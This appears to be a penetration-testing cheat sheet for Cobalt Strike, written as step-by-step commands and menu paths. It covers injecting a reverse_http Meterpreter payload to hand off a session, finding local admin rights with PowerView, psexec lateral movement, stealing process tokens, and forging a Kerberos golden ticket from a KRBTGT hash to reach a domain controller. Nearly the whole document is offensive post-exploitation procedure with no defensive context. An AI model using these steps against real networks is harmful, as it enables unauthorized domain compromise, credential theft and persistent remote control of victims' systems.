# Cobalt Strike

Move a meterpreter / metasploit session to Cobalt

```
in Cobalt
windows/beacon_http/reverse_http

in Metasploit
use exploit/windows/local/payload_inject
set PAYLOAD windows/meterpreter/reverse_http
set LHOST [IP of compromised system or cobalt IP]
set LPORT 80
set session 1
set DisablePayloadHandler true
exploit (-j)
```

View targets available from Initial Target

```
Right Click Target --> Explore -->Net View
```

Find where we are a local admin

```
beacon: powershell-import /root/PowerTools/PowerView/powerview.ps1
beacon: Invoke-FindLocalAdminAccess
```

Login to target where we are local admin

```
Right Click Target -->Login -->psexec (change Listener to SMB beacon)(choose a session)
(user session's current token)
```

Get token from processes

```
Right Click Target -->Explore-->Process List-->Steal Token
```

Create Multiple beacons on targets

```
Select the targets --> Right Click -->Login -->psexec --> choose a beacon with an elevated token-->
(user session's current token)-->Launch
```

Golden Ticket Generation

```
Need four items
1)User
2)Domain
3)Domain SID
4)KRBTGT Hash

3) shell whoami /user to obtain SID (also provides 1 & 2)
4) obtained from a previous compromise (i.e. NTLM hashdump)

With that Right Click-->Access-->Golden Ticket-->Input Four fields-->Build

Verify it works: #shell dir \\[DC]\C$
```



